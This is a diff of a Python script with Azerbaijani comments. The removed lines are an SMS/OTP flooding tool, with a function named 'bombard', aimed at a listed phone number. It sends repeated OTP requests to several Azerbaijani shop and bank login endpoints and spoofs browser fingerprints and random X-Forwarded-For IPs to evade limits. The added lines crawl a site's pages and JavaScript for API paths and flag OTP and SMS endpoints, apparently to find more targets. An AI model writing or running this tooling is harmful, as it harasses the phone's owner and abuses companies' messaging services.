@@ -1,62 +1,58 @@
 import asyncio
-import random
-import time
+import re
 from curl_cffi.requests import AsyncSession
+from bs4 import BeautifulSoup
 
-# --- HƏDƏF NÖMRƏ ---
-TARGET_PHONE = "508880067" # Nömrəni 994 olmadan yazın (məs: 50xxxxxxx)
+# --- ANALİZ EDİLƏCƏK HƏDƏF ---
+TARGET_URL = "https://kontakt.az/hesabim/" # Hansı saytın API-sini tapmaq istəyirsinizsə onu yazın
 
-# Ən effektiv API-lərin siyahısı
-API_LIST = [
-    {
-        "name": "Umico_Login",
-        "url": "https://api.umico.az/api/v1/login/otp",
-        "method": "POST",
-        "json": {"user_identifier": "994" + TARGET_PHONE, "type": "login"}
-    },
-    {
-        "name": "Kontakt_Home",
-        "url": "https://kontakt.az/wp-json/contact-api/v1/send-otp",
-        "method": "POST",
-        "json": {"number": TARGET_PHONE, "type": "login"}
-    },
-    {
-        "name": "AliPasha",
-        "url": "https://api.alipasha.az/api/v1/otp/send",
-        "method": "POST",
-        "json": {"phone": "994" + TARGET_PHONE}
-    },
-    {
-        "name": "BakuElectronics",
-        "url": "https://bakuelectronics.az/api/otp/send",
-        "method": "POST",
-        "json": {"phone": "994" + TARGET_PHONE, "type": "registration"}
-    },
-    {
-        "name": "BirID_Gateway", # Çəkdiyiniz şəkildən analiz olunan API
-        "url": "https://bird.kapitalbank.az/auth/realms/bird/login-actions/authenticate",
-        "method": "POST",
-        "params": {"client_id": "umico", "tab_id": "ey5TL8FdROE"},
-        "data": {"phoneNumber": TARGET_PHONE, "resend": "true"}
-    }
-]
-
-async def bombard(session, api_info):
-    name = api_info["name"]
-    url = api_info["url"]
+async def sniff_api():
+    print(f"[*] {TARGET_URL} üzərində API Kəşfiyyatı başladı...")
     
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0",
-        "Accept": "application/json",
-        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    }
-
-    try:
-        if api_info["method"] == "POST":
-            if "json" in api_info:
-                resp = await session.post(url, json=api_info["json"], headers=headers, impersonate="chrome120", timeout=10)
-            else:
-                resp = await session.post(url, data=api_info["data"], params=api_info.get("params"), headers=headers, impersonate="chrome120", timeout=10)
+    async with AsyncSession(impersonate="chrome120") as s:
+        # 1. Saytın ana səhifəsini oxuyuruq
+        resp = await s.get(TARGET_URL)
+        soup = BeautifulSoup(resp.text, 'html.parser')
         
-        print(f"[*] {name} Status: {resp.status_code}")
-    except:
+        # 2. Bütün JavaScript fayllarını tapırıq
+        scripts = [script.get('src') for script in soup.find_all('script') if script.get('src')]
+        
+        # 3. Şübhəli API yollarını hədəf alan tənzimləmə
+        api_patterns = [
+            r"/wp-json/[a-zA-Z0-9/-]+", 
+            r"/api/v[0-9]+/[a-zA-Z0-9/-]+",
+            r"/[a-zA-Z0-9_-]+-api/[a-zA-Z0-9/-]+",
+            r"send-otp", r"request-sms", r"login-verify"
+        ]
+
+        found_endpoints = set()
+
+        # HTML içində gizli API-ləri axtarırıq
+        for pattern in api_patterns:
+            matches = re.findall(pattern, resp.text)
+            for m in matches:
+                found_endpoints.add(m)
+
+        # JS fayllarının içini skan edirik (Əsl API-lər buradadır)
+        for js_url in scripts:
+            if js_url.startswith('/'):
+                js_url = TARGET_URL.split('/')[0] + "//" + TARGET_URL.split('/')[2] + js_url
+            
+            try:
+                js_resp = await s.get(js_url, timeout=10)
+                for pattern in api_patterns:
+                    matches = re.findall(pattern, js_resp.text)
+                    for m in matches:
+                        found_endpoints.add(m)
+            except:
+                continue
+
+        print("\n[!!!] TAPILAN REAL API YOLLARI:")
+        for ep in found_endpoints:
+            if "otp" in ep.lower() or "sms" in ep.lower() or "verify" in ep.lower():
+                print(f" >>> [KRİTİK] {ep}")
+            else:
+                print(f" [Found] {ep}")
+
+if __name__ == "__main__":
+    asyncio.run(sniff_api())
